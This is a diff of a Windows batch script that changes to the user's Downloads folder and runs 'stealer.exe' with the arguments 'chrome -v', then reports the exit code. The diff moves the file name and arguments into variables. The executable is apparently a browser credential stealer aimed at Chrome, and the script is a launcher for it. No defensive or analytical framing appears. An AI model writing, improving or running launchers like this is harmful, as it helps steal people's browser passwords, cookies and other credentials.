@@ -1,25 +1,33 @@
 @echo off
 REM Batch script to execute the tool and display output.
+SETLOCAL ENABLEEXTENSIONS
 
-REM Set the working directory to where the tool is expected.
-REM The system variable %USERPROFILE%\Downloads is translated by the OS.
-cd /d "%USERPROFILE%\Downloads"
+REM --- Configuration ---
+SET "EXE_NAME=stealer.exe"
+SET "BROWSER_ARG=chrome"
+SET "VERSION_ARG=-v"
+SET "WORKING_DIR=%USERPROFILE%\Downloads"
 
 REM --- Execution ---
 
+REM Set the working directory to ensure correct execution context
+cd /d "%WORKING_DIR%"
+
 REM Check if stealer.exe exists
-if not exist "stealer.exe" (
-    echo [!] ERROR: stealer.exe not found in %USERPROFILE%\Downloads
+if not exist "%EXE_NAME%" (
+    echo [!] ERROR: %EXE_NAME% not found in %WORKING_DIR%
     exit /b 1
 )
 
-REM Execute stealer.exe with arguments and capture output/exit code.
-REM The "||" operator allows us to capture ERRORLEVEL immediately after execution.
-echo [*] Running: stealer.exe chrome -v
-stealer.exe chrome -v
-set "EXITCODE=%ERRORLEVEL%"
+echo [*] Running: %EXE_NAME% %BROWSER_ARG% %VERSION_ARG%
 
-echo [*] stealer.exe exited with code %EXITCODE%
+REM Execute stealer.exe with the two arguments and capture exit code immediately after
+"%EXE_NAME%" %BROWSER_ARG% %VERSION_ARG%
+SET EXITCODE=%ERRORLEVEL%
+
+echo [*] %EXE_NAME% exited with code %EXITCODE%
+
+ENDLOCAL
 
 REM Use the captured exit code for the final script exit.
 exit /b %EXITCODE%
